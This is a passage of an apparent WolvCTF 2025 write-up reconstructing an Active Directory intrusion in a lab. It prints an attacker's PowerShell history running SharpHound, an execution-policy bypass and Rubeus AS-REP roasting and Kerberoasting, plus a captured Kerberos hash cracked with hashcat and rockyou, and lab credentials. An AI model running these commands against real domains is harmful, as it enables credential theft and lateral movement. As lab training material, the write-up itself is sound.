+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319003701_hu8253463876567749022.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319003701_hu1095597603361298607.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319003701_hu2450495346306792754.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319003701_hu2605609980283344387.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3830"
+        height="2392"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319003701_hu3505889092747329341.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319003701_hu3619014628315243678.png 330w,/posts/wolvctf-2025/Pasted_image_20250319003701_hu3505889092747329341.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319003701_hu2232931960657495587.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319003701_hu17185336127076151349.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<pre tabindex="0"><code>T%P%P%P%P%P%P%P%P%P%P%c% Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  WOLVCTF
+    DefaultUserName               :  WOLVCTF\Dan
+    DefaultPassword               :  DansSuperCoolPassw0rd!!
+    AltDefaultUserName            :  loot-in-hex:656e61626c335f347574306c6f67306e5f306b3f3f213f7d
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319003514_hu11904108623331716980.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319003514_hu1043446301024997695.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319003514_hu911237438216617553.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319003514_hu13739226488185108255.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="2080"
+        height="890"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319003514_hu16887177487833460439.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319003514_hu6173890525165736999.png 330w,/posts/wolvctf-2025/Pasted_image_20250319003514_hu16887177487833460439.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319003514_hu16134540224611264405.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319003514_hu3932861601534080485.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Here we can see a domain user&rsquo;s credentials in the Autologon! And some loot in the <code>AltDefaultUserName</code>, Lets decode using cyberchef:</p>
+<p><a href="https://cyberchef.org/#recipe=From_Hex%28%27Auto%27%29&amp;input=NjU2ZTYxNjI2YzMzNWYzNDc1NzQzMDZjNmY2NzMwNmU1ZjMwNmIzZjNmMjEzZjdk" target="_blank" rel="noreferrer">https://cyberchef.org/#recipe=From_Hex('Auto')&input=NjU2ZTYxNjI2YzMzNWYzNDc1NzQzMDZjNmY2NzMwNmU1ZjMwNmIzZjNmMjEzZjdk</a></p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319004023_hu1639183754822452761.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319004023_hu9855548759055757768.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319004023_hu10601406197578858673.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319004023_hu15331419363157255147.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="2728"
+        height="1558"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319004023_hu4458469184422263030.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319004023_hu8828244387123684349.png 330w,/posts/wolvctf-2025/Pasted_image_20250319004023_hu4458469184422263030.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319004023_hu5826274561858314799.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319004023_hu1905233827075376097.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Flag part 3:</p>
+<pre tabindex="0"><code>enabl3_4ut0log0n_0k??!?}
+</code></pre><hr>
+<h4 id="final-flag" class="relative group">Final Flag <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#final-flag" aria-label="Anchor">#</a></span></h4><pre tabindex="0"><code>wctf{d0nt_3n4bl3_xP_cmdsh311_w1th_d3fault_cr3ds_0r_enabl3_4ut0log0n_0k??!?}
+</code></pre><h2 id="active-2-lateral-movement" class="relative group">Active 2: Lateral Movement <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#active-2-lateral-movement" aria-label="Anchor">#</a></span></h2><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250324181146_hu17172925066234211492.webp 330w,/posts/wolvctf-2025/Pasted_image_20250324181146_hu17016146818189611631.webp 660w
+            
+              
+                ,/posts/wolvctf-2025/Pasted_image_20250324181146_hu13055726038881834821.webp 966w
+              
+            
+            
+              
+                ,/posts/wolvctf-2025/Pasted_image_20250324181146_hu13055726038881834821.webp 966w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="966"
+        height="1414"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250324181146_hu6614962967936542044.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250324181146_hu3324952112666696839.png 330w,/posts/wolvctf-2025/Pasted_image_20250324181146_hu6614962967936542044.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250324181146.png 966w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250324181146.png 966w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="challenge-description-4" class="relative group">Challenge Description <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#challenge-description-4" aria-label="Anchor">#</a></span></h3><p>The attacker moved laterally throughout our domain. I&rsquo;m hearing reports from other members of <code>wolvctf.corp</code> that 3 lower level accounts were compromised (excluding the 2 higher level compromised accounts). Figure out which ones these are, and follow the attacker&rsquo;s steps to collect the flag.</p>
+<p><code>Users_Backup.zip</code>&rsquo;s password is <code>wolvctf</code></p>
+<p><code>sha256sum:709b595d63ac9660b9c67de357337ee55ffd6658412b8c5c27b35efc05617893</code></p>
+<p><em>Flag is split up into 3 parts.</em></p>
+<p><a href="https://drive.google.com/drive/folders/11MzaiPYvosPSYlKzqqAVX_muiv5p4yQA?usp=sharing" target="_blank" rel="noreferrer">https://drive.google.com/drive/folders/11MzaiPYvosPSYlKzqqAVX_muiv5p4yQA?usp=sharing</a></p>
+<h3 id="solve-4" class="relative group">Solve <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#solve-4" aria-label="Anchor">#</a></span></h3><h4 id="part-1-enumerating-dans-account" class="relative group">Part 1: Enumerating Dan&rsquo;s Account <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#part-1-enumerating-dans-account" aria-label="Anchor">#</a></span></h4><p>Since the attacker got access to dan&rsquo;s account, lets check their powershell logs for any actions</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy]
+└─$ cat dan/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt
+cd Desktop
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\dan\Documents -OutputPrefix &#34;wolvctf_audit&#34;
+powershell -ep bypass
+.\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\dan\Documents -OutputPrefix &#34;wolvctf_audit&#34;
+Import-Module \SharpHound.ps1
+Import-Module .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\dan\Documents -OutputPrefix &#34;wolvctf_audit&#34;
+.\Rubeus.exe asreproast /user:emily /domain:wolvctf.corp /dc:DC01.wolvctf.corp &gt; asreproast.output
+ .\Rubeus.exe kerberoast &gt; kerberoast.output
+runas /User:wolvctf\emily cmd
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319005158_hu4661011604673308281.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319005158_hu16566555527107370262.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319005158_hu14447192814177293515.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319005158_hu5289000214835118071.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3804"
+        height="1220"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319005158_hu12697045401976355463.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319005158_hu8788541584355719355.png 330w,/posts/wolvctf-2025/Pasted_image_20250319005158_hu12697045401976355463.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319005158_hu16216665403838308701.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319005158_hu16932147834185146775.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Looks like they saved hashes obtained by Rubeus in some files, lets check the ASREPRoasted one:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy]
+└─$ cat dan/Desktop/asreproast.output 
+��
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0 
+
+
+[*] Action: AS-REP roasting
+
+[*] Target User            : emily
+[*] Target Domain          : wolvctf.corp
+[*] Target DC              : DC01.wolvctf.corp
+
+[*] Using domain controller: DC01.wolvctf.corp (fe80::af8f:bc46:1257:36be%5)
+[*] Building AS-REQ (w/o preauth) for: &#39;wolvctf.corp\emily&#39;
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$emily@wolvctf.corp:34C3460101DA5A3081FA4F6518A0ECE1$619944A029EF908C7
+      8A80E2559C06788E2D86AEB1C94CD97E4540E5EA57C550C7FBD768D6EA24DBC66CFC6B8A9E39C364
+      39CA4B50DCF29F3C078785F876835B239B3628F561D080F83294C9A3BC8D1C4DEC538A15339257DC
+      AAB20F33EE168BDEA0671C4AB92DA6B089D7700E7BE42564706BFA903654EDF11376C1994BBE6B9C
+      C65E53275EF3148B638AA5A52284E29912C3CA2171FD50FBD6929511416B51F8C4F8CB9383DA74E8
+      DB3B0493A2654093C44BC399695525DD90E271A90C9992024A1D05E4188EC588663D2D849142AED6
+      5C5B77C38ED3DC7BB65178A565248F199B5DC2D382D2DA016DAD023
+
+[*_*] d2N0Znthc3IzcHIwNHN0M2Q/Xw==               
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319004551_hu2111437784017518285.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319004551_hu8859076632002505591.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319004551_hu6244456245096549729.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319004551_hu9657721370522114503.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3832"
+        height="2394"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319004551_hu1901940324334162407.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319004551_hu13936693267675934906.png 330w,/posts/wolvctf-2025/Pasted_image_20250319004551_hu1901940324334162407.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319004551_hu17173278422073217508.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319004551_hu2928316923716770881.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The attacker ran Rubeus to obtain the ASREPRoasted hash, and appended the first part of the flag to the output file:</p>
+<p><a href="https://cyberchef.org/#recipe=From_Base64%28%27A-Za-z0-9%2B/%3D%27,true,false%29&amp;input=ZDJOMFpudGhjM0l6Y0hJd05ITjBNMlEvWHc9PSA" target="_blank" rel="noreferrer">https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=ZDJOMFpudGhjM0l6Y0hJd05ITjBNMlEvWHc9PSA</a></p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319004711_hu3741920304163571872.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319004711_hu13419221928502713847.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319004711_hu271465095523402433.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319004711_hu10208798060811569554.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="2620"
+        height="1488"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319004711_hu1414721186032437078.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319004711_hu103971468084945617.png 330w,/posts/wolvctf-2025/Pasted_image_20250319004711_hu1414721186032437078.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319004711_hu14765792886994471037.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319004711_hu9460927365185450068.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Flag part 1:</p>
+<pre tabindex="0"><code>wctf{asr3pr04st3d?_
+</code></pre><hr>
+<h4 id="flag-part-2-enumerating-emilys-account" class="relative group">Flag Part 2: Enumerating Emily&rsquo;s account <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#flag-part-2-enumerating-emilys-account" aria-label="Anchor">#</a></span></h4><p>Lets clean up the hash from before</p>
+<pre tabindex="0"><code>$krb5asrep$emily@wolvctf.corp:34C3460101DA5A3081FA4F6518A0ECE1$619944A029EF908C78A80E2559C06788E2D86AEB1C94CD97E4540E5EA57C550C7FBD768D6EA24DBC66CFC6B8A9E39C36439CA4B50DCF29F3C078785F876835B239B3628F561D080F83294C9A3BC8D1C4DEC538A15339257DCAAB20F33EE168BDEA0671C4AB92DA6B089D7700E7BE42564706BFA903654EDF11376C1994BBE6B9CC65E53275EF3148B638AA5A52284E29912C3CA2171FD50FBD6929511416B51F8C4F8CB9383DA74E8DB3B0493A2654093C44BC399695525DD90E271A90C9992024A1D05E4188EC588663D2D849142AED65C5B77C38ED3DC7BB65178A565248F199B5DC2D382D2DA016DAD023
+</code></pre><p>and attempt to crack it with rockyou</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/ctf/Active/challenge/scratch]
+└─$ sudo hashcat -m 18200 asreproast.hash /usr/share/wordlists/rockyou.txt --force                         
+[sudo] password for kali: 
+hashcat (v6.2.6) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+...
+
+$krb5asrep$emily@wolvctf.corp:34c3460101da5a3081fa4f6518a0ece1$619944a029ef908c78a80e2559c06788e2d86aeb1c94cd97e4540e5ea57c550c7fbd768d6ea24dbc66cfc6b8a9e39c36439ca4b50dcf29f3c078785f876835b239b3628f561d080f83294c9a3bc8d1c4dec538a15339257dcaab20f33ee168bdea0671c4ab92da6b089d7700e7be42564706bfa903654edf11376c1994bbe6b9cc65e53275ef3148b638aa5a52284e29912c3ca2171fd50fbd6929511416b51f8c4f8cb9383da74e8db3b0493a2654093c44bc399695525dd90e271a90c9992024a1d05e4188ec588663d2d849142aed65c5b77c38ed3dc7bb65178a565248f199b5dc2d382d2da016dad023:youdontknowmypasswordhaha
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$emily@wolvctf.corp:34c3460101da5a3081fa4...dad023
+Time.Started.....: Wed Mar 19 00:58:29 2025, (5 secs)
+Time.Estimated...: Wed Mar 19 00:58:34 2025, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   514.2 kH/s (1.02ms) @ Accel:256 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 2574336/14344385 (17.95%)
+Rejected.........: 0/2574336 (0.00%)
+Restore.Point....: 2573312/14344385 (17.94%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: youkids -&gt; youarehot1
+Hardware.Mon.#1..: Util: 64%
+
+Started: Wed Mar 19 00:58:27 2025
+Stopped: Wed Mar 19 00:58:36 2025
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319005906_hu8765564542769681332.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319005906_hu6542576923495812711.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319005906_hu393281155079439581.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319005906_hu15063268880330694185.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3840"
+        height="2396"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319005906_hu15932933570435332119.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319005906_hu7673043424135120040.png 330w,/posts/wolvctf-2025/Pasted_image_20250319005906_hu15932933570435332119.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319005906_hu1602051856540950172.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319005906_hu8331398307012707949.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Now that Emily&rsquo;s password was able to be obtained via rockyou, lets check her powershell history to see what the attacker did next:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy]
+└─$ cat emily/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt
+cd C:\Users\emily
+tree /f /a &gt; tree.txt
+type tree.txt
+cd Documents
+dir
+type README
+echo &#34;James asked me to keep his password secret, so I made sure to take extra precautions.&#34; &gt;&gt; C:\Users\Public\loot.txt
+echo &#34;Note to self: Password for the zip is same as mine, with 777 at the end&#34; &gt;&gt; C:\Users\Public\loot.txt
+del README
+cp .\important.7z C:\Users\Public
+del C:\Users\Public\loot.txt
+del C:\Users\Public\important.7z
+runas /User:wolvctf\james cmd
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319005510_hu11966334346166382766.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319005510_hu9222211006664823450.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319005510_hu1367656148482233183.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319005510_hu13883420022158205228.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="2626"
+        height="704"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319005510_hu18037150151161060285.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319005510_hu3346579362194505135.png 330w,/posts/wolvctf-2025/Pasted_image_20250319005510_hu18037150151161060285.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319005510_hu6300253784267703236.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319005510_hu9535523332285097761.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>So it looks like the attacker deleted a README file containing the following:</p>
+<pre tabindex="0"><code>James asked me to keep his password secret, so I made sure to take extra precautions.
+
+Password for the zip is same as mine, with 777 at the end
+</code></pre><p>In her directory we also see the following</p>
+<pre tabindex="0"><code>──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy]
+└─$ cat emily/tree.txt                                                                       
+��Folder PATH listing
+Volume serial number is 1E33-4D3F
+C:.
+|   tree.txt
+|   
++---Desktop
++---Documents
+|       important.7z
+|       README
+|       
++---Downloads
++---Favorites
++---Links
++---Music
++---Pictures
++---Saved Games
+\---Videos
+                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy]
+└─$ 
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319010158_hu13246230302279067633.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319010158_hu6278982515716776991.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319010158_hu13709109349483246746.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319010158_hu10451140966275295491.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3822"
+        height="2066"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319010158_hu14530136612737568126.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319010158_hu6716233833967294600.png 330w,/posts/wolvctf-2025/Pasted_image_20250319010158_hu14530136612737568126.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319010158_hu11026426833574371457.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319010158_hu13743767506806113476.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Luckily for us, the <code>important.7z</code> is still there. Since we know her password, lets try using what the README said and do the following</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319010632_hu735842888466459034.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319010632_hu11969965396682531300.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319010632_hu6505061298179727802.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319010632_hu7395491349939411262.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3202"
+        height="1624"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319010632_hu11629116809956490586.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319010632_hu16336396300456277221.png 330w,/posts/wolvctf-2025/Pasted_image_20250319010632_hu11629116809956490586.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319010632_hu8943092821052942413.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319010632_hu14394269378280571684.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy]
+└─$ cp emily/Documents/important.7z ../scratch/    
+                                                                               
+┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy]
+└─$ cd ../scratch                                  
+                             
+┌──(kali㉿kali)-[~/ctf/Active/challenge/scratch]
+└─$ 7z x -p&#34;youdontknowmypasswordhaha777&#34; important.7z
+
+7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
+ 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM
+
+Scanning the drive for archives:
+1 file, 2220152 bytes (2169 KiB)
+
+Extracting archive: important.7z
+--
+Path = important.7z
+Type = 7z
+Physical Size = 2220152
+Headers Size = 264
+Method = LZMA2:3m 7zAES
+Solid = +
+Blocks = 1
+
+Everything is Ok
+
+Folders: 1
+Files: 3
+Size:       2252831
+Compressed: 2220152
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319010750_hu13574713553292259426.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319010750_hu2299967284096834511.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319010750_hu143625012490994376.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319010750_hu12406258639454344485.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1944"
+        height="962"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319010750_hu11838441252660850545.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319010750_hu17264808331263752261.png 330w,/posts/wolvctf-2025/Pasted_image_20250319010750_hu11838441252660850545.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319010750_hu5994525714089225429.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319010750_hu6560600491218113153.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Looks like the extraction worked!</p>
+<p>Now lets see if there&rsquo;s anything we can do with these files</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/…/Active/challenge/scratch/important]
+└─$ binwalk car.jpeg    
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+9296          0x2450          JPEG image data, JFIF standard 1.01
+
+                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/…/Active/challenge/scratch/important]
+└─$ dd if=car.jpeg of=extracted_hidden.jpg bs=1 skip=9296
+67772+0 records in
+67772+0 records out
+67772 bytes (68 kB, 66 KiB) copied, 0.120803 s, 561 kB/s
+                                                              
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
